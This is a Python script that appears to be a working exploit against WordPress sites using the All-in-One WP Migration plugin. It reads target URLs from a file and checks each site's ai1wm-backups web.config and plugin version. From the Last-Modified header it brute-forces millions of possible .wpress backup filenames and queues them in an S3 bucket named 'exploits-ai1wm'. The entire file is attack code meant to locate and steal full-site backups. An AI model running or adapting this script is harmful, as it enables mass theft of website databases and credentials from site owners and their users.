import pymongo
import requests
import datetime
import json
from urllib.parse import urlparse

import boto3
client = boto3.client("s3")

s3_bucket_name = "exploits-ai1wm"

_headers = {
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0",
    "Connection":"close","Accept":"*/*"
}

def check_version(url):
    vercheck = requests.get(f"{url}/wp-content/plugins/all-in-one-wp-migration/readme.txt",
                            headers=_headers,
                            verify=False).text
    if "7.15" in vercheck:
        return False
    else:
        return True

def check_config(url):
            
    print (f'checking {url}')
    try:
        response = requests.get(f"{url}/wp-content/ai1wm-backups/web.config",
                                headers=_headers,
                                verify=False)
    except Exception as err:
        print (err)
        print (url,':: failed to get web.config')
        return False

    
    if not ".wpress" in response.text:
        print (url,':: cant find .wpress in response')
        return False
    
    headers = response.headers
    if not 'Last-Modified' in headers:
        print (url,':: cant last-modified in headers')
        return False
    
    if not check_version(url):
        print (url,':: failed version check')
        return False
    
    last_modified = headers['last-modified']
    return last_modified

def register_url(search_url):
    folder_name = f"{search_url}"
    client.put_object(Bucket=s3_bucket_name, Key=(folder_name))
    
    
def process_url(base_url):
    if last_modified := check_config(base_url): 
        timestamp = datetime.datetime.strptime(last_modified,"%a, %d %b %Y %H:%M:%S %Z")
        time_ymd = timestamp.strftime("%Y%m%d")
        time_hms = timestamp.strftime("%H")
        
        r = requests.get(""+base_url+"", headers=_headers,verify=False)
        domain = urlparse(r.url).netloc

        urls = [
            f"{r.url}/wp-content/ai1wm-backups/{domain}-{time_ymd}-{time_hms}{i:02d}{j:02d}-{k:03d}.wpress"
            for i in range(0,60)
            for j in range(0,60)
            for k in range(100,1000)
        ]

        n = len(urls)
        for i,search_url in enumerate(urls):
            register_url(search_url)
            if i%1000==0:
                print (f"{i}/{n} urls registered")
        

        
def read_file(fname):
    with open(fname) as f:
        lines = f.readlines()
        for i,line in enumerate(lines):
            base_url = line.rstrip()
            process_url(base_url)
            
read_file('backups.txt')
